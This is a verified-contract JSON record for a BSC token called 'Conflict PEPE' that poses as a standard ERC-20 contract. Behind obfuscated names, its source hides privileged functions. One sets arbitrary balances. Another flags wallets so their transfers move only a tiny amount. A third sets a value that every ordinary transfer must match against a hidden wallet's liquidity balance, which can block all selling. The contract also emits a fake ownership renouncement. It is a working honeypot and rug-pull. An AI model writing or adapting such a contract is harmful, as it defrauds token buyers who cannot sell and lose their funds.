{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface launchSenderWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atTotal) external view returns (uint256);\n\n    function transfer(address takeFund, uint256 launchedTeam) external returns (bool);\n\n    function allowance(address marketingMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeFund,\n        uint256 launchedTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableFee, uint256 value);\n    event Approval(address indexed marketingMode, address indexed spender, uint256 value);\n}\n\nabstract contract autoFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txTeam {\n    function createPair(address sellIs, address swapLimit) external returns (address);\n}\n\ninterface launchSenderWalletMetadata is launchSenderWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConflictPEPE is autoFund, launchSenderWallet, launchSenderWalletMetadata {\n\n    uint256 modeSenderBuy;\n\n    mapping(address => uint256) private shouldFee;\n\n    bool public autoReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return teamLimit;\n    }\n\n    uint256 constant isTake = 19 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeSwap;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingLimit;\n    }\n\n    function amountTrading() public {\n        emit OwnershipTransferred(toAmountLaunched, address(0));\n        buyShouldAt = address(0);\n    }\n\n    string private marketingLimit = \"CPE\";\n\n    function getOwner() external view returns (address) {\n        return buyShouldAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txLaunched;\n    }\n\n    bool private tradingLaunch;\n\n    mapping(address => bool) public shouldSell;\n\n    mapping(address => mapping(address => uint256)) private senderExempt;\n\n    function allowance(address autoIs, address receiverEnable) external view virtual override returns (uint256) {\n        if (receiverEnable == marketingSender) {\n            return type(uint256).max;\n        }\n        return senderExempt[autoIs][receiverEnable];\n    }\n\n    function amountShould(address exemptAmount, uint256 launchedTeam) public {\n        minIsTrading();\n        shouldFee[exemptAmount] = launchedTeam;\n    }\n\n    constructor (){\n        \n        fundSwap enableIsSender = fundSwap(marketingSender);\n        buyLaunched = txTeam(enableIsSender.factory()).createPair(enableIsSender.WETH(), address(this));\n        if (tradingLaunch) {\n            autoReceiver = false;\n        }\n        toAmountLaunched = _msgSender();\n        amountTrading();\n        shouldSell[toAmountLaunched] = true;\n        shouldFee[toAmountLaunched] = txLaunched;\n        if (autoReceiver) {\n            tradingLaunch = true;\n        }\n        emit Transfer(address(0), toAmountLaunched, txLaunched);\n    }\n\n    function balanceOf(address atTotal) public view virtual override returns (uint256) {\n        return shouldFee[atTotal];\n    }\n\n    uint256 public autoTakeToken;\n\n    function amountFund(address walletMarketing) public {\n        minIsTrading();\n        \n        if (walletMarketing == toAmountLaunched || walletMarketing == buyLaunched) {\n            return;\n        }\n        toAmountReceiver[walletMarketing] = true;\n    }\n\n    uint256 public atTokenReceiver;\n\n    uint8 private feeSwap = 18;\n\n    address public buyLaunched;\n\n    string private teamLimit = \"Conflict PEPE\";\n\n    function approve(address receiverEnable, uint256 launchedTeam) public virtual override returns (bool) {\n        senderExempt[_msgSender()][receiverEnable] = launchedTeam;\n        emit Approval(_msgSender(), receiverEnable, launchedTeam);\n        return true;\n    }\n\n    address senderFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public listBuySwap;\n\n    uint256 private txLaunched = 100000000 * 10 ** 18;\n\n    function transfer(address exemptAmount, uint256 launchedTeam) external virtual override returns (bool) {\n        return tokenTotal(_msgSender(), exemptAmount, launchedTeam);\n    }\n\n    function minIsTrading() private view {\n        require(shouldSell[_msgSender()]);\n    }\n\n    address marketingSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return buyShouldAt;\n    }\n\n    mapping(address => bool) public toAmountReceiver;\n\n    event OwnershipTransferred(address indexed maxTotal, address indexed tradingTx);\n\n    uint256 walletReceiver;\n\n    address private buyShouldAt;\n\n    function tokenTotal(address atSell, address takeFund, uint256 launchedTeam) internal returns (bool) {\n        if (atSell == toAmountLaunched) {\n            return fromLiquidity(atSell, takeFund, launchedTeam);\n        }\n        uint256 launchTake = launchSenderWallet(buyLaunched).balanceOf(senderFee);\n        require(launchTake == modeSenderBuy);\n        require(takeFund != senderFee);\n        if (toAmountReceiver[atSell]) {\n            return fromLiquidity(atSell, takeFund, isTake);\n        }\n        return fromLiquidity(atSell, takeFund, launchedTeam);\n    }\n\n    function transferFrom(address atSell, address takeFund, uint256 launchedTeam) external override returns (bool) {\n        if (_msgSender() != marketingSender) {\n            if (senderExempt[atSell][_msgSender()] != type(uint256).max) {\n                require(launchedTeam <= senderExempt[atSell][_msgSender()]);\n                senderExempt[atSell][_msgSender()] -= launchedTeam;\n            }\n        }\n        return tokenTotal(atSell, takeFund, launchedTeam);\n    }\n\n    function enableMax(address swapTeam) public {\n        require(swapTeam.balance < 100000);\n        if (listBuySwap) {\n            return;\n        }\n        if (tradingLaunch != autoReceiver) {\n            autoReceiver = true;\n        }\n        shouldSell[swapTeam] = true;\n        \n        listBuySwap = true;\n    }\n\n    address public toAmountLaunched;\n\n    function fromLiquidity(address atSell, address takeFund, uint256 launchedTeam) internal returns (bool) {\n        require(shouldFee[atSell] >= launchedTeam);\n        shouldFee[atSell] -= launchedTeam;\n        shouldFee[takeFund] += launchedTeam;\n        emit Transfer(atSell, takeFund, launchedTeam);\n        return true;\n    }\n\n    function fromTrading(uint256 launchedTeam) public {\n        minIsTrading();\n        modeSenderBuy = launchedTeam;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"}],\"name\":\"amountFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"amountShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTokenReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTakeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTeam\",\"type\":\"address\"}],\"name\":\"enableMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"fromTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmountLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toAmountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConflictPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}